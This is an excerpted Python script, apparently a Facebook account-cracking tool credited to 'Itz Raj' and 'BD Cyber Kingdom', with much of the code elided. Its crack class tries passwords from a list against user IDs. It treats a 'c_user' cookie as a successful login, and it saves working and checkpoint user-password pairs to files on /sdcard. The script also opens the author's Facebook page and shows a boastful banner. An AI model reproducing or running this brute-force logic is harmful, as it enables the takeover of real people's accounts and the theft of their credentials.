...
def main_apv():
    ...
    try:
        ...
        print ("[*]｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡")
        time.sleep(6)
        os.system("xdg-open https://www.facebook.com/Raj.The.Brand.22/")
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;32m[ Raj Vau 😘] \033[1;97m%s/%s   \033[1;92m[ OK-:%s ]  \033[1;91m[ CP-:%s ] '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;32m[ITZRAJ-SUCCESSFUL] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('/sdcard/ITZRAJ_OK.txt','a').write('%s\n' % wrt)
				access = q['loc']
				...
				try:
					...
					pass
				print('\r\033[1;91m[ITZRAJ-CHECKPOINT] %s | %s%s      ' % (user,pw,tahun(user)))
				wrt = '%s - %s%s'%(user,pw,tahu(user))
				cp.append(wrt)
				open('/sdcard/ITZRAJ_CP.txt','a').write('%s\n' % wrt)
				break
			else:
				continue
		loop += 1
...
banner="""\033[1;94m   
 ...
 |_|  \_\__,_| |     \/ \__,_|\__,_|
           ...
           |__/                     
\033[1;37m ｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡
\033[1;94m ⇨AUTHOR    : Itz Raj
\033[1;95m ⇨GROUP  : BD Cyber Kingdom
\033[1;96m ⇨FACEBOOK  : Raj Chowdhury
\033[1;93m ⇨     Sex But Ok😘
